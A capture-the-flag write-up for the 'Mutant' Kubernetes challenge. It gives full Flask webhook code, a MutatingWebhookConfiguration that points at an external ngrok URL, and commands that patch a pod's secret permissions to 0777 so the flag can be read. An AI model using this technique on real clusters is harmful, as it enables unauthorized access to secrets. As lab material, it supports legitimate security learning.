```
Mutant
cloud
🔥 kcal:  	263
Reps:  	14
Trainer:  	p4ck3t0

Train and do Kubernetes like a mutant!
We have two identical instances.

nc mutant.flu.xxx 8888

nc mutant2.flu.xxx 8888

The gym is closed. You cannot complete workouts anymore.
```

This challenge has 5 namespaces
```
NAME              STATUS   AGE
default           Active   71s
flag-reader       Active   60s
kube-node-lease   Active   71s
kube-public       Active   71s
kube-system       Active   71s
mutant            Active   60s
```
```
$ kubectl get pods -n mutant
No resources found in mutant namespace.
$ kubectl get pods -n flag-reader
NAME                           READY   STATUS              RESTARTS   AGE
flag-reader                    0/1     ContainerCreating   0          2s
pod-applier-78fd9f7868-xdhhj   1/1     Running             0          100s
```
pod-applier pod is creating and destroying flag-reader pod continuously 
```
$ kubectl logs -f flag-reader -n flag-reader
Executing cat /flag/flag...
cat: can't open '/flag/flag': Permission denied

Shutting down...
```
now the thing is pod contains `flag` secret and pod  has not permission because we have different user who is trying to read the file but only owner has permission to read the secret. 
but webhookconfigurations permission is given. So we can mutate the webhook configuration. 

How it all works together:

- When a pod is created or updated in the cluster, Kubernetes checks if there are any applicable webhooks.
- It finds your MutatingWebhookConfiguration and sends an admission review to your ngrok URL.
- ngrok forwards this request to your local Flask server.
- Your Flask server receives the request, modifies the pod spec to change the secret's permissions, and sends back a response with the patch.
- Kubernetes applies this patch before actually creating/updating the pod.
- As a result, the flag-reader pod is created with the secret mounted with full permissions (0o777), allowing it to read the flag.

here is the flask server 
```
from flask import Flask, request, jsonify
import json
import base64

app = Flask(__name__)

@app.route('/mutate', methods=['POST'])
def mutate_pod():
    admission_review = request.get_json()
    admission_request = admission_review['request']

    pod = admission_request['object']

    if pod['metadata']['name'] == "flag-reader":
        pod['spec']['volumes'][0]['secret']['defaultMode'] = 0o777
        
    patch = [
        {
            "op": "replace",
            "path": "/spec/volumes/0/secret/defaultMode",
            "value": 0o777
        }
    ]

    patch_bytes = json.dumps(patch).encode('utf-8')
    patch_base64 = base64.b64encode(patch_bytes).decode('utf-8')

    admission_response = {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "response": {
            "uid": admission_request['uid'],
            "allowed": True,
            "patchType": "JSONPatch",
            "patch": patch_base64 
        }
    }

    return jsonify(admission_response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

```
and here is the mutating webhook configuration 
```
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: mutate-flag-reader
webhooks:
  - name: mutate.flag-reader.k8s.io
    clientConfig:
      url: "https://e908-103-37-201-178.ngrok-free.app/mutate"
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: [""]
        apiVersions: ["v1"]
        resources: ["pods"]
    sideEffects: None
    admissionReviewVersions: ["v1"]
    failurePolicy: Ignore
```

run the flask server 
```bash
$ python3 webhook.py
$ ngrok http 5000
$ kubectl apply -f webhook-config.yaml
```
then when pod-applier will create the flag-reader pod again, it is able to read the flag secret.
```
$ kubectl logs -f flag-reader -n flag-reader

Executing cat /flag/flag...
flag{get_those_ga1nz}

Shutting down..
```
